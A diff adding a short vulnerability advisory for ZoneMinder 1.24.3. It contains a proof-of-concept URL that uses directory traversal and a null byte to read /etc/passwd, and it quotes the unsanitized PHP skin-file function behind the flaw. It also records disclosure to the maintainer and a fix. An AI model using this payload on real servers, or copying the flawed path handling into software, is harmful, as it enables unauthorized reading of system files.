@@ -1,0 +1,34 @@
+# Exploit Title: Zoneminder 1.24.3 Remote File Inclusion Vulnerability
+# Date: 2011-07-22
+# Author: Iye (iye[dot]cba-at-gmail[dot]com)
+# Software Link: http://www.zoneminder.com/
+# Version: 1.24.3 (Tested). 1.24.4 probably too, not tested
+# Tested on: Ubuntu 10.04
+
+You must be authenticated as a user in the Web App to exploit it. It's
+not a must to be admin.
+
+POC: http://localhost/zm/index.php?action=56&markMids%5B%5D=1&deleteBtn=Delete&editBtn=Edit&view=../../../../../../../../../../../../../../../etc/passwd%00
+
+Reported to proyect mantainer (Philip Coombes) on 2011-07-22
+Fix patch made Philip Coombes: http://www.zoneminder.com/downloads/lfi-patch.txt
+
+Vulnerable Code:
+
+/var/www/zm/includes/functions.php
+--------------------------------------------------------
+
+function getSkinFile( $file )
+{
+    global $skinBase;
+    $skinFile = false;
+    foreach ( $skinBase as $skin )
+    {
+        $tempSkinFile = 'skins'.'/'.$skin.'/'.$file;
+        if ( file_exists( $tempSkinFile ) )
+            $skinFile = $tempSkinFile;
+    }
+    return( $skinFile );
+}
+
+--------------------------------------------------------
